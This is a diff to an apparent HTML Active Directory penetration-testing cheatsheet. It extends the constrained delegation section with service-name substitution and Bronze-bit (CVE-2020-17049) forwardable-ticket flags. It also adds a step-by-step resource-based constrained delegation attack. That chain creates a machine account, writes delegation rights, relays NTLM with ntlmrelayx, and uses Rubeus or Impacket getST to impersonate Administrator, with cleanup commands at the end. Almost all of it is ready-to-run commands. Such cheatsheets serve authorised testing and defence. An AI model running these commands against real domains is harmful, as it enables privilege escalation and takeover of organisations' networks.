@@ -1370,11 +1370,13 @@ Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:&lt;target
 tgs::s4u<span class="w"> </span>/tgt:&lt;kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/user:&lt;target<span class="w"> </span>user&gt;<span class="w"> </span>/service:&lt;target<span class="w"> </span>SPN&gt;
 
 <span class="c1"># Rubeus</span>
-Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>tgt<span class="p">|</span>kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/msdsspn:&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>/ptt
+Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>tgt<span class="p">|</span>kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/msdsspn:&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>/ptt<span class="w"> </span><span class="o">[</span>/altservice:&lt;other<span class="w"> </span>spns&gt;<span class="o">]</span>
 </code></pre></div>
 <p>Request TGT for service user and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code> with Impacket's <code>getST</code>:</p>
-<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;
+<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class="w"> </span><span class="o">[</span>-force-forwardable<span class="o">]</span><span class="w"> </span><span class="o">[</span>-altservice<span class="w"> </span>&lt;other<span class="w"> </span>spns&gt;<span class="o">]</span>
 </code></pre></div>
+<p><strong>Note</strong>: <code>-force-forwardable</code> tries to force the TGS from S4USelf to be forwardable; it works if the target is vulnerable to Bronze-bit (CVE-2020-17049).</p>
+<p><strong>Note</strong>: since the SPN part is not encrypted in the request, it's possible to change it with the <code>/altservice</code> (Rubeus) and <code>-altservice</code> (Impacket's getST) flags.</p>
 <h3 id="resource-based-constrained-delegation-rbcd_1">Resource-Based Constrained Delegation (RBCD)</h3>
 <p>Enumerate machine quota:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
@@ -1383,8 +1385,57 @@ Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<
 <span class="c"># AD Module</span>
 <span class="nb">Get-ADDomain</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">DistinguishedName</span> <span class="p">|</span> <span class="nb">Get-ADObject</span> <span class="n">-Properties</span> <span class="s1">'ms-DS-MachineAccountQuota'</span> 
 </code></pre></div>
-<p>Enumerate machine quota remotely:</p>
-<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PASSWORD</span><span class="w"> </span>-M<span class="w"> </span>maq
+<p>Enumerate machine quota remotely with <code>NetExec</code>:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>maq
+</code></pre></div>
+<p>Enumerate workstations' <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
+<span class="nb">Get-NetComputer</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="n">name</span><span class="p">,</span> <span class="n">msds-allowedtoactonbehalfofotheridentity</span><span class="p">*</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">-Property</span> <span class="n">msds-allowedtoactonbehalfofotheridentity</span> <span class="o">-NE</span> <span class="n">-Value</span> <span class="nv">$null</span>
+
+<span class="c"># AD Module</span>
+<span class="nb">Get-ADComputer</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span> <span class="n">-Filter</span> <span class="p">*</span>
+</code></pre></div>
+<p>Enumerate workstations' <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> remotely with Impacket's <code>rbcd</code>:</p>
+<div class="highlight"><pre><span></span><code>rbcd.py<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'read'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
+</code></pre></div>
+<p>Add a new machine account to the domain:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
+<span class="nv">$Password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">"&lt;password&gt;"</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nb">New-ADComputer</span> <span class="n">-Name</span> <span class="s2">"&lt;name&gt;"</span> <span class="n">-SamAccountName</span> <span class="s2">"&lt;name&gt;$"</span> <span class="n">-Path</span> <span class="s2">"CN=Computers, DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'"</span> <span class="n">-UserPrincipalName</span> <span class="s2">"&lt;sam account name&gt;$@&lt;domain&gt;"</span> <span class="n">-Enabled</span> <span class="nv">$true</span>  <span class="n">-AccountPassword</span> <span class="nv">$Password</span>
+</code></pre></div>
+<p>Add a new machine account to the domain remotely with Impacket's <code>addcomputer</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'&lt;name&gt;$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-dc-host<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'</span>
+</code></pre></div>
+<p>Add controlled machine account to target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>. Requires a user with enough privileges:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
+<span class="nb">Set-ADComputer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="s1">'&lt;controlled machine account&gt;$'</span>
+</code></pre></div>
+<p>Add controlled machine account to target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> remotely with Impacket's <code>rbcd</code>. Requires a user with enough privileges:</p>
+<div class="highlight"><pre><span></span><code>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
+</code></pre></div>
+<p>Create a machine account and add it to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> using relayed credentials with Impacket's <code>ntlmrelayx</code>:</p>
+<div class="highlight"><pre><span></span><code>ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>ldaps://&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-smb2support<span class="w"> </span>--add-computer<span class="w"> </span>&lt;computer<span class="w"> </span>name&gt;<span class="w"> </span>--delegate-access
+</code></pre></div>
+<p>Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine with <code>Rubeus</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># First request a TGT</span>
+Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:<span class="s2">"&lt;controlled machine account&gt;</span>$<span class="s2">"</span><span class="w"> </span>/password:&lt;password&gt;<span class="w"> </span>/nowrap
+
+<span class="c1"># Use TGT to obtain a forwardable TGS</span>
+Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/nowrap<span class="w"> </span>/impersonateuser:<span class="s2">"administrator"</span><span class="w"> </span>/msdsspn:<span class="s2">"host/&lt;target host&gt;"</span><span class="w"> </span>/altservice:cifs,ldap<span class="w"> </span>/domain:<span class="s2">"&lt;domain&gt;"</span><span class="w"> </span>/user:<span class="s2">"&lt;controlled machine account&gt;</span>$<span class="s2">"</span><span class="w"> </span>/ticket:&lt;ticket<span class="w"> </span>from<span class="w"> </span>previous<span class="w"> </span>command&gt;
+</code></pre></div>
+<p>Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine remotely with Impacket's <code>getST</code>:</p>
+<div class="highlight"><pre><span></span><code>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/&lt;target host&gt;'</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$/&lt;password&gt;'</span>
+</code></pre></div>
+<p>Use the resulting ticket in a <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#pass-the-attacks">Pass-the-Ticket</a> attack.</p>
+<p>Cleanup:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># AD Module</span>
+<span class="nb">Set-ADComputer</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">machine</span><span class="p">&gt;</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="nv">$Null</span> 
+<span class="nb">Remove-ADComputer</span> <span class="n">-Identity</span> <span class="s1">'&lt;controlled machine DN&gt;'</span>
+</code></pre></div>
+<p>Cleanup with Impacket's <code>rbcd</code> and <code>addcomputer</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-rbcd<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">'&lt;controlled machine account&gt;$'</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">'&lt;target machine account&gt;$'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'&lt;dc ip&gt;'</span><span class="w"> </span>-action<span class="w"> </span><span class="s1">'flush'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;username&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
+
+impacket-addcomputer<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">'&lt;name&gt;$'</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span>-dc-host<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;'</span><span class="w"> </span>-delete
 </code></pre></div>
 <h3 id="dnsadmins">DNSAdmins</h3>
 <p>Enumerate the members of the DNSAdmins group:</p>
